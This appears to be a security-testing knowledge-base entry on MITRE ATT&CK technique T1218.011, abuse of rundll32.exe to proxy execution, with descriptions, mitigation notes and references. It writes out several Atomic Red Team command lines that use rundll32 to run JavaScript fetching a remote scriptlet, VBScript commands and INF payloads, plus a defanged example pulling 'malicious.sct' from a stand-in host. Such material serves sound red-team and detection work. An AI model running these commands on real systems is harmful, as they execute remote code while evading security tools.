---
name: "T1218.011_rundll32"
description: "Adversaries may abuse rundll32.exe to proxy execution of malicious code."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1218.011
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1218.011"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1218/011"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1218
  - T1218.001
  - T1218.002
  - T1218.003
  - T1218.004
  - T1218.005
  - T1218.007
  - T1218.008
  - T1218.009
  - T1218.010
  - T1218.012
  - T1218.013
  - T1218.014
  - T1218.015
prerequisites:
  - T1218
severity_boost:
  T1218: "Chain with T1218 for deeper attack path"
  T1218.001: "Chain with T1218.001 for deeper attack path"
  T1218.002: "Chain with T1218.002 for deeper attack path"
---

# T1218.011 Rundll32

> **Sub-technique of:** T1218

## High-Level Description

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe.

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code> This behavior has been seen used by malware such as Poweliks.

Threat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if Rundll32 technique is applicable to target environment
- [ ] Check Windows systems for indicators of Rundll32
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Rundll32 execute JavaScript Remote Payload With GetObject

Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. 
This has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)

Note: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed.

**Supported Platforms:** windows

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
```

### Atomic Test 2: Rundll32 execute VBscript command

Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
Upon execution calc.exe will be launched

**Supported Platforms:** windows

```cmd
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
```

### Atomic Test 3: Rundll32 execute VBscript command using Ordinal number

Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
Upon execution calc.exe will be launched

**Supported Platforms:** windows

```cmd
rundll32 vbscript:"\..\mshtml,#135 "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
```

### Atomic Test 4: Rundll32 advpack.dll Execution

Test execution of a command using rundll32.exe with advpack.dll.
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
Upon execution calc.exe will be launched

**Supported Platforms:** windows

```cmd
rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
```

**Dependencies:**
- Inf file must exist on disk at specified location ("#{inf_to_execute}")

### Atomic Test 5: Rundll32 ieadvpack.dll Execution

Test execution of a command using rundll32.exe with ieadvpack.dll.
Upon execution calc.exe will be launched

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml

**Supported Platforms:** windows

```cmd
rundll32.exe ieadvpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
```

**Dependencies:**
- Inf file must exist on disk at specified location ("#{inf_to_execute}")


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Rundll32 by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1218.011 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1050 Exploit Protection
Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control.


## Detection

### Detection Strategy for T1218.011 Rundll32 Abuse


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Rundll32 technique applicable | Medium | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [rundll32.exe defense evasion](https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/)
- [Attackify Rundll32.exe Obscurity](https://www.attackify.com/blog/rundll32_execution_order/)
- [This is Security Command Line Confusion](https://www.stormshield.com/news/poweliks-command-line-confusion/)
- [Github NoRunDll](https://github.com/gtworek/PSBits/tree/master/NoRunDll)
- [lolbas project Ieframe.dll](https://lolbas-project.github.io/lolbas/Libraries/Ieframe/)
- [lolbas project Zipfldr.dll](https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/)
- [Trend Micro CPL](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)
- [Atomic Red Team - T1218.011](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218.011)
- [MITRE ATT&CK - T1218.011](https://attack.mitre.org/techniques/T1218/011)
